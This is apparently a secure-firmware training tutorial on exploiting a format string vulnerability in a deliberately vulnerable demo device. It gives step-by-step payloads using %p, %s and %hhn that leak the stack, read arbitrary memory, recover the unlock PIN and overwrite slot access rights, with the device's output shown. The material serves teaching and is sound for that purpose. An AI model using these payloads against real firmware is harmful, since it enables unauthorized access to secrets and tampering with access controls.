tutorial1 format string bug exploitation
----------------------------------------

1) Black box exploitation

SD echoes back the command. Try to see if a format string can be echoed.
> senda %x
< ready...
< 20000467
< Rx: read value at slot x. ex R2
< ...
Instead of echoing "%d", SD echoes a integer : there is a format string vulnerability !
You can learn values of R1, R2 and R3 registers just before echo (we cannot get R0, which points to the command buffer):
> senda %p-%p-%p
< 2000046d-1-20000150
Note: use %p to retrieve pointer values, and for some reason, when using senda tool, you have to separate "%p"s with a character (here "-").
You can see here that both R1 and R3 point to SRAM.
If you add more "%p", you'll start dumping the stack contents
> senda %p-%p-%p-%p-%p-%p-%p
< 20000479-1-20000150-0-0-8002e9c-0 
Here the stack value at current stack pointer is 0, the one above is 0, and above you can see a pointer on flash.
You can dump more stack values.

There we can stop a bit. The value in R1 looks interesting, because it seems to increase with the command length.
> senda %p
< 20000467
> senda -%p
< -20000468
Looks like it is the end of the command in memory. This allows us to guess the start of the command buffer (0x20000464) in memory, which can be useful for other attacks.

To get more information, you can also try to output data as string :
> send %s
Nothing interesting on the output, R1 is probably pointing to data with 0 in it (or not ascii).
You can also target the flash pointer at 0x08002e9c:
>senda %p-%p-%p-%p-%p-%s-%p
<ready...
<20000479-1-20000150-0-0-Ix: increment value in slot x
<-0
Seems this flash address contains application help string ("Ix: increment value in slot x")

Another thing to try is to crash the application using %d on a bad pointer:
>senda %p-%s
<ready...
<Call Stack:
<  #0  PC: 0x8001200      [strlen + 0x1f]
<  #1  PC: 0x80004e8      [_PrintfFullNoMb + 0x35f]
<  #2  PC: 0x80022a0      [printf + 0x1b]
<  #3  PC: 0x8002c72  in  receive_command(0x20000464 "%p-%s", 0x20000460)   at  C:\julien\SW Attacks\Work\try\TrainingWritingSec
<  #4  PC: 0x8002bda  in  receive_and_process_command()   at  C:\julien\SW Attacks\Work\try\TrainingWritingSecureFW\tutorial1\ma
<  #5  PC: 0x8002bf8  in  main(0, 0x08002E9C)   at  C:\julien\SW Attacks\Work\try\TrainingWritingSecureFW\tutorial1\main.c:25
<  #6  PC: 0x8002ed6      [_call_main + 0xd]
<
<User error: Memory access error:
<Trying to read outside mapped memory at address 0x80000 when PC is 0x8001200.
<Check your memory configuration.
<ERROR: Unable to execute: driver error. After the error occurred, the program counter (PC) was 0x8001200.
This gives you plentiful of useful information, like return addresses, addresses of several functions (strlen at 0x08001200-0x1f, printf at 0x08002295, ...)
It confirms the command buffer address (0x20000464).

Reading anywhere
----------------

As you can see, with %s you can derefence pointers present in the stack and read data they point to.
Can you exploit this to read anywhere in memory ?
First, you can observe that after dumping enough stack values, you start to dump the content of the input buffer.
>senda %p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p
< ready...
< 20000485-1-20000150-0-0-8002e9c-0-0-8002bdb-20-252d7025
252d7025 is "%p-%" encoded in ascii.
Since you control the content of input buffer, you control the pointer in the stack.

You can use the tobin.py script and remove the '-':
> tobin.py %p%p%p%p%p%p%p%p%p%p%p | senda
< 2000047b120000150008002e9c008002bdb1670257025

Now you can add a bad pointer (AAAA, 0x41414141 in binary) to the start of the input buffer. 
>tobin.py AAAA%p%p%p%p%p%p%p%p%p%p%p | senda
< AAAA2000047f120000150008002e9c008002bdb1a41414141
You could try to put a pointer to real memory instead:
>tobin.py \w20000000%p%p%p%p%p%p%p%p%p%p%p | senda
< 

Unfortunatly, this pointer contains a zero byte, which ends the format string, so it does not work.
Since all interesting addresses (RAM, flash) contain at least one zero byte, you cannot attack like this.
One solution is to place the pointer at the end of the input buffer:

>tobin.py %p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p__%pAAAA | senda
< ...255f5f__41414141AAAA
Here a few "__" were added to better see the result, as well as a lot of %p to point on the end of the buffer.

Now you can try to dereference this 0x41414141 address to check it works (replace last %p by %s).
>tobin.py %p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p__%sAAAA | senda
< ...
< User error: Memory access error:
< Trying to read outside mapped memory at address 0x41414141 when PC is 0x80011e8.
You can pick a good pointer:
>tobin.py %p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p__%s\w20000000 | senda
< ... __?T
You can read anywhere you want, zero bytes are not an issue anymore. 
The only problem is %s encodes read in ASCII: 
- a zero byte terminates reading
- characters below 32 are difficult to guess 
But still you can try all possible location in RAM or flash, and see what happens.

Reading slot & PIN
------------------

To find the slots location, you can write a seldom used value in slot 0 and slot 1 ('$' for instance, encoded as 36 in decimal).
Then you can parse all addresses in RAM until you find those '$' characters. You just need to add write commands before your attack command:
tobin.py w036 w136 %p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p__%s\w20000000 | senda

To save you time, look at your application map file to find directly the correct address for the 'info' variable.
Here the address is 0x20000130:
> tobin.py w036 w136 %p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p__%s\w20000130 | senda
< ...__?0?
Not so interesting, let's try an address slightly after that (0x20000132):
< __2304$?$?c?d
You can see two '$' characters. To make sure they really are slot 0 and slot 1 value, you can write different values in these slot and check that the value correspond.

Now you can read all slots, this way, provided slot value are not below 32 (special ASCCI character, often not displayed).

Also, have you noticed the 4 ASCII numeric characters in the last output (2304) ? 
Could it be the unlock PIN code ? Indeed it is ! You can try to use this PIN to unlock the SD.

Writing anywhere
----------------

Would it be also possible to create a write anywhere command ? 
Yes, with %n (which writes the number of characters printed so far to the current parameter).
>tobin.py s %c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%8c_%hhnAAAA | senda
< User error: Memory access error:
< Trying to write outside mapped memory at address 0x41414141 when PC is 0x80006bc.
(%hhn is to write a byte)

We can write anywhere we want !

Still, three issues make exploiting this difficult:
1. Where to write ? Without the binary code, you would have to poke in the dark, hoping to overwrite some interesting data. 
2. The SD crashes after the exploit, because of a buffer overflow. So any modification you could achieve would be gone next time you restart. To go further you would need to control the buffer overflow, but if you can do that it buffer overflow would be much easier to exploit to write where you want.

For 2), imagine that they is no buffer overflow. Modify the code by setting the size of the "c" buffer to 100 (in main.c receive_and_process_command function).
Now you can write up to 104 bytes before overflowing.

You can try to write to slot 7 access right (0x20000145)
>tobin.py s %c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%1c_%hhn\w20000145 s w722 r7 | senda
<ready...
<E?P? @  @8%%%%%%%%%%%%%_E?
<...
<s
<device locked
<0  RW-L
<1  RW-L
<2  RW-L
<3  R--L
<4  R-IL
<5  RW--
<6  R---
<7  ---L
It worked, you changed slot 7 access rights to "LOCKED". It means you wrote the value 0xX8 in the slot.
To open all other slots, you need to write 0xXF, so you can just print 7 more bytes (last %1c becomes %8c)
>tobin.py s %c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%8c_%hhn\w20000145 w722 r7 | senda
<...
<device locked
<0  RW-L
<1  RW-L
<2  RW-L
<3  R--L
<4  R-IL
<5  RW--
<6  R---
<7  RWIL
<ok
<w722
<ok
<r7
<22
<ok
it worked !
